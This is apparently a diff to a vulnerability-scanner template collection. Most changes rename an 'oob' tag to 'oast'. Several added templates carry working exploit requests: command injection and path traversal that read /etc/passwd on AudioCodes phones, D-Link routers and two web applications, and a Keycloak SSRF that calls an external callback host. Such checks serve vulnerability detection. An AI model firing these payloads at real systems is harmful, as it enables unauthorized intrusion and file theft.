@@ -7233,7 +7233,7 @@
           "https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html"
         ],
         "severity": "medium",
-        "tags": "cve,cve2014,weblogic,oracle,ssrf,oob"
+        "tags": "cve,cve2014,weblogic,oracle,ssrf,oast"
       },
       "requests": [
         {
@@ -8935,7 +8935,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2015-7450"
         ],
         "severity": "critical",
-        "tags": "cve,cve2015,websphere,deserialization,rce,oob"
+        "tags": "cve,cve2015,websphere,deserialization,rce,oast"
       },
       "requests": [
         {
@@ -9161,7 +9161,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2015-8813"
         ],
         "severity": "high",
-        "tags": "cve,cve2015,ssrf,oob"
+        "tags": "cve,cve2015,ssrf,oast"
       },
       "requests": [
         {
@@ -11251,7 +11251,7 @@
           "https://github.com/SuperHacker-liuan/cve-2017-10271-poc"
         ],
         "severity": "high",
-        "tags": "cve,cve2017,rce,oracle,weblogic,oob"
+        "tags": "cve,cve2017,rce,oracle,weblogic,oast"
       },
       "requests": [
         {
@@ -11574,7 +11574,7 @@
           "https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE"
         ],
         "severity": "critical",
-        "tags": "cve,cve2017,solr,apache,oob,xxe"
+        "tags": "cve,cve2017,solr,apache,oast,xxe"
       },
       "requests": [
         {
@@ -12523,7 +12523,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2017-18638"
         ],
         "severity": "high",
-        "tags": "cve,cve2017,graphite,ssrf,oob"
+        "tags": "cve,cve2017,graphite,ssrf,oast"
       },
       "requests": [
         {
@@ -12559,7 +12559,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2017-3506"
         ],
         "severity": "high",
-        "tags": "cve,cve2017,weblogic,oracle,rce,oob"
+        "tags": "cve,cve2017,weblogic,oracle,rce,oast"
       },
       "requests": [
         {
@@ -13238,7 +13238,7 @@
           "https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-171018bca2c3"
         ],
         "severity": "medium",
-        "tags": "cve,cve2017,atlassian,jira,ssrf,oob"
+        "tags": "cve,cve2017,atlassian,jira,ssrf,oast"
       },
       "requests": [
         {
@@ -13707,7 +13707,7 @@
           "https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/"
         ],
         "severity": "high",
-        "tags": "cve,cve2018,jenkins,ssrf,oob"
+        "tags": "cve,cve2018,jenkins,ssrf,oast"
       },
       "requests": [
         {
@@ -13764,6 +13764,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-10093",
+      "info": {
+        "author": "wisnupramoedya",
+        "classification": {
+          "cve-id": "CVE-2018-10093",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 8.8,
+          "cwe-id": "CWE-862"
+        },
+        "description": "AudioCodes IP phone 420HD devices using firmware version 2.2.12.126 allow Remote Code Execution.",
+        "name": "AudioCode 400HD - RCE",
+        "reference": [
+          "https://www.exploit-db.com/exploits/46164",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-10093"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,rce,iot"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "admin:.*:"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/command.cgi?cat%20/etc/passwd"
           ]
         }
       ]
@@ -13875,7 +13918,7 @@
           "https://medium.com/@0x616163/lg-n1a1-unauthenticated-remote-command-injection-cve-2018-14839-9d2cf760e247"
         ],
         "severity": "critical",
-        "tags": "cve,cve2018,lg-nas,rce,oob"
+        "tags": "cve,cve2018,lg-nas,rce,oast"
       },
       "requests": [
         {
@@ -13941,6 +13984,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/uir//etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-10823",
+      "info": {
+        "author": "wisnupramoedya",
+        "classification": {
+          "cve-id": "CVE-2018-10823",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 8.8,
+          "cwe-id": "CWE-78"
+        },
+        "description": "An issue was discovered on D-Link DWR-116 through 1.06, DWR-512 through 2.02, DWR-712 through 2.02, DWR-912 through 2.02, DWR-921 through 2.02, and DWR-111 through 1.01 devices. An authenticated attacker may execute arbitrary code by injecting the shell command into the chkisg.htm page Sip parameter. This allows for full control over the device internals.",
+        "name": "D-Link Routers - Command Injection",
+        "reference": [
+          "https://www.exploit-db.com/exploits/45676",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-10823"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,rce,iot,dlink,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd"
           ]
         }
       ]
@@ -14193,6 +14279,49 @@
           "path": [
             "{{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd",
             "{{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-12054",
+      "info": {
+        "author": "wisnupramoedya",
+        "classification": {
+          "cve-id": "CVE-2018-12054",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Arbitrary File Read exists in PHP Scripts Mall Schools Alert Management Script via the f parameter in img.php, aka absolute path traversal.",
+        "name": "Schools Alert Management Script - Arbitrary File Read",
+        "reference": [
+          "https://www.exploit-db.com/exploits/44874",
+          "https://www.cvedetails.com/cve/CVE-2018-12054"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/img.php?f=/./etc/./passwd"
           ]
         }
       ]
@@ -14655,6 +14784,49 @@
       ]
     },
     {
+      "id": "CVE-2018-13980",
+      "info": {
+        "author": "wisnupramoedya",
+        "classification": {
+          "cve-id": "CVE-2018-13980",
+          "cvss-metrics": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 5.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "The websites that were built from Zeta Producer Desktop CMS before 14.2.1 are vulnerable to unauthenticated file disclosure if the plugin \"filebrowser\" is installed, because of assets/php/filebrowser/filebrowser.main.php?file=../ directory traversal.",
+        "name": "Zeta Producer Desktop CMS 14.2.0 - Local File Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/45016",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-13980"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-14013",
       "info": {
         "author": "pikpikcu",
@@ -14882,7 +15054,7 @@
           "http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SERVER-SIDE-REQUEST-FORGERY.txt"
         ],
         "severity": "high",
-        "tags": "cve,cve2018,dlink,ssrf,oob"
+        "tags": "cve,cve2018,dlink,ssrf,oast"
       },
       "requests": [
         {
@@ -15050,7 +15222,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2018-16167"
         ],
         "severity": "critical",
-        "tags": "cve,cve2018,logontracer,rce,oob"
+        "tags": "cve,cve2018,logontracer,rce,oast"
       },
       "requests": [
         {
@@ -17382,7 +17554,7 @@
           "https://paper.seebug.org/1009/"
         ],
         "severity": "high",
-        "tags": "cve,cve2019,apache,rce,solr,oob"
+        "tags": "cve,cve2019,apache,rce,solr,oast"
       },
       "requests": [
         {
@@ -19668,7 +19840,7 @@
         "name": "Apache Solr 8.3.0 - Remote Code Execution via Velocity Template",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-17558",
         "severity": "high",
-        "tags": "cve,cve2019,apache,rce,solr,oob"
+        "tags": "cve,cve2019,apache,rce,solr,oast"
       },
       "requests": [
         {
@@ -19766,7 +19938,7 @@
           "https://github.com/igniterealtime/Openfire/pull/1497"
         ],
         "severity": "critical",
-        "tags": "cve,cve2019,ssrf,openfire,oob"
+        "tags": "cve,cve2019,ssrf,openfire,oast"
       },
       "requests": [
         {
@@ -20252,7 +20424,7 @@
           "https://www.exploit-db.com/exploits/46729"
         ],
         "severity": "high",
-        "tags": "cve,cve2019,oracle,xxe,oob"
+        "tags": "cve,cve2019,oracle,xxe,oast"
       },
       "requests": [
         {
@@ -20343,7 +20515,7 @@
           "https://www.exploit-db.com/exploits/46729"
         ],
         "severity": "high",
-        "tags": "cve,cve2019,oracle,xxe,oob"
+        "tags": "cve,cve2019,oracle,xxe,oast"
       },
       "requests": [
         {
@@ -21306,7 +21478,7 @@
           "https://hackerone.com/reports/713900"
         ],
         "severity": "medium",
-        "tags": "cve,cve2019,atlassian,jira,ssrf,oob"
+        "tags": "cve,cve2019,atlassian,jira,ssrf,oast"
       },
       "requests": [
         {
@@ -21979,6 +22151,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-10770",
+      "info": {
+        "author": "dhiyaneshDk",
+        "classification": {
+          "cve-id": "CVE-2020-10770",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "cvss-score": 5.3,
+          "cwe-id": "CWE-601"
+        },
+        "description": "A flaw was found in Keycloak before 13.0.0, where it is possible to force the server to call out an unverified URL using the OIDC parameter request_uri. This flaw allows an attacker to use this parameter to execute a Server-side request forgery (SSRF) attack.",
+        "name": "Keycloak 12.0.1 - 'request_uri ' Blind Server-Side Request Forgery (SSRF) (Unauthenticated)",
+        "reference": [
+          "https://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html",
+          "https://www.exploit-db.com/exploits/50405",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-10770"
+        ],
+        "severity": "medium",
+        "tags": "keycloak,ssrf,oast,cve,cve2020"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/"
           ]
         }
       ]
@@ -22705,7 +22915,7 @@
           "https://blog.0xlabs.com/2021/02/wavlink-rce-CVE-2020-13117.html"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,wavlink,rce,oob"
+        "tags": "cve,cve2020,wavlink,rce,oast"
       },
       "requests": [
         {
@@ -25314,7 +25524,7 @@
           "https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,sophos,rce,oob"
+        "tags": "cve,cve2020,sophos,rce,oast"
       },
       "requests": [
         {
@@ -25398,7 +25608,7 @@
           "https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,dlink,rce,oob"
+        "tags": "cve,cve2020,dlink,rce,oast"
       },
       "requests": [
         {
@@ -25676,7 +25886,7 @@
           "https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,netgear,rce,oob"
+        "tags": "cve,cve2020,netgear,rce,oast"
       },
       "requests": [
         {
@@ -25989,7 +26199,7 @@
           "https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,terramaster,rce,oob"
+        "tags": "cve,cve2020,terramaster,rce,oast"
       },
       "requests": [
         {
@@ -26117,7 +26327,7 @@
           "https://www.exploit-db.com/exploits/48980"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,monitorr,rce,oob"
+        "tags": "cve,cve2020,monitorr,rce,oast"
       },
       "requests": [
         {
@@ -26154,7 +26364,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2020-28976"
         ],
         "severity": "medium",
-        "tags": "cve,cve2020,ssrf,wordpress,wp-plugin,oob"
+        "tags": "cve,cve2020,ssrf,wordpress,wp-plugin,oast"
       },
       "requests": [
         {
@@ -26694,7 +26904,7 @@
         "name": "Linksys RE6500 Pre-Auth RCE",
         "reference": "https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html",
         "severity": "critical",
-        "tags": "cve,cve2020,linksys,rce,oob,router"
+        "tags": "cve,cve2020,linksys,rce,oast,router"
       },
       "requests": [
         {
@@ -27808,7 +28018,7 @@
         "name": "Unauthenticated Blind SSRF in SAP",
         "reference": "https://github.com/InitRoot/CVE-2020-6308-PoC",
         "severity": "medium",
-        "tags": "cve,cve2020,sap,ssrf,oob"
+        "tags": "cve,cve2020,sap,ssrf,oast"
       },
       "requests": [
         {
@@ -27943,7 +28153,7 @@
         "name": "OpenSMTPD 6.4.0 - 6.6.1 Remote Code Execution",
         "reference": "https://www.openwall.com/lists/oss-security/2020/01/28/3",
         "severity": "critical",
-        "tags": "cve,cve2020,smtp,opensmtpd,network,rce,oob"
+        "tags": "cve,cve2020,smtp,opensmtpd,network,rce,oast"
       },
       "network": [
         {
@@ -28064,7 +28274,7 @@
           "https://www.adminxe.com/2183.html"
         ],
         "severity": "critical",
-        "tags": "cve,cve2020,zimbra,ssrf,oob"
+        "tags": "cve,cve2020,zimbra,ssrf,oast"
       },
       "requests": [
         {
@@ -28633,7 +28843,7 @@
           "https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/"
         ],
         "severity": "high",
-        "tags": "cve,cve2020,cacti,rce,oob"
+        "tags": "cve,cve2020,cacti,rce,oast"
       },
       "requests": [
         {
@@ -29371,7 +29581,7 @@
           "https://github.com/EdgeSecurityTeam/Vulnerability/blob/c0af411de9adb82826303c5b05a0d766fb553f28/Cisco%20HyperFlex%20HX%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2021-1497-CVE-2021-1498%EF%BC%89.md"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,cisco,rce,oob"
+        "tags": "cve,cve2021,cisco,rce,oast"
       },
       "requests": [
         {
@@ -29420,7 +29630,7 @@
           "https://github.com/EdgeSecurityTeam/Vulnerability/blob/c0af411de9adb82826303c5b05a0d766fb553f28/Cisco%20HyperFlex%20HX%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2021-1497-CVE-2021-1498%EF%BC%89.md"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,cisco,rce,oob"
+        "tags": "cve,cve2021,cisco,rce,oast"
       },
       "requests": [
         {
@@ -29779,7 +29989,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2021-21287"
         ],
         "severity": "high",
-        "tags": "cve,cve2021,minio,ssrf,oob"
+        "tags": "cve,cve2021,minio,ssrf,oast"
       },
       "requests": [
         {
@@ -30582,7 +30792,7 @@
           "https://docs.gitlab.com/ee/api/lint.html"
         ],
         "severity": "high",
-        "tags": "cve,cve2021,gitlab,ssrf,oob"
+        "tags": "cve,cve2021,gitlab,ssrf,oast"
       },
       "requests": [
         {
@@ -31841,7 +32051,7 @@
         "name": "Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Unauthenticated RFI and SSRF",
         "reference": "https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a",
         "severity": "critical",
-        "tags": "cve,cve2021,wordpress,lfi,ssrf,oob"
+        "tags": "cve,cve2021,wordpress,lfi,ssrf,oast"
       },
       "requests": [
         {
@@ -32538,7 +32748,7 @@
           "https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,ssrf,rce,exchange,oob,microsoft"
+        "tags": "cve,cve2021,ssrf,rce,exchange,oast,microsoft"
       },
       "requests": [
         {
@@ -34208,7 +34418,7 @@
           "https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,tenda,rce,oob"
+        "tags": "cve,cve2021,tenda,rce,oast"
       },
       "requests": [
         {
@@ -34383,7 +34593,7 @@
           "https://packetstormsecurity.com/files/163225/Websvn-2.6.0-Remote-Code-Execution.html"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,websvn,rce,oob"
+        "tags": "cve,cve2021,websvn,rce,oast"
       },
       "requests": [
         {
@@ -34419,7 +34629,7 @@
           "https://blog.diefunction.io/vulnerabilities/ghsl-2021-023"
         ],
         "severity": "high",
-        "tags": "cve,cve2021,nodejs,rce,oob"
+        "tags": "cve,cve2021,nodejs,rce,oast"
       },
       "requests": [
         {
@@ -34602,7 +34812,7 @@
           "https://github.com/RaspAP/raspap-webgui"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,rce,raspap,oob"
+        "tags": "cve,cve2021,rce,raspap,oast"
       },
       "requests": [
         {
@@ -34648,7 +34858,7 @@
           "https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/"
         ],
         "severity": "high",
-        "tags": "cve,cve2021,geutebruck,rce,oob"
+        "tags": "cve,cve2021,geutebruck,rce,oast"
       },
       "requests": [
         {
@@ -35295,7 +35505,7 @@
           "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3577"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,rce,oob,motorola,iot"
+        "tags": "cve,cve2021,rce,oast,motorola,iot"
       },
       "requests": [
         {
@@ -35311,6 +35521,12 @@
               "type": "word",
               "words": [
                 "http"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "set_city_timezone"
               ]
             }
           ],
@@ -35337,7 +35553,7 @@
           "https://research.nccgroup.com/2021/07/26/technical-advisory-sunhillo-sureline-unauthenticated-os-command-injection-cve-2021-36380/"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,sureline,rce,oob"
+        "tags": "cve,cve2021,sureline,rce,oast"
       },
       "requests": [
         {
@@ -36012,7 +36228,7 @@
           "https://nvd.nist.gov/vuln/detail/CVE-2021-40438"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,ssrf,apache,mod-proxy,oob"
+        "tags": "cve,cve2021,ssrf,apache,mod-proxy,oast"
       },
       "requests": [
         {
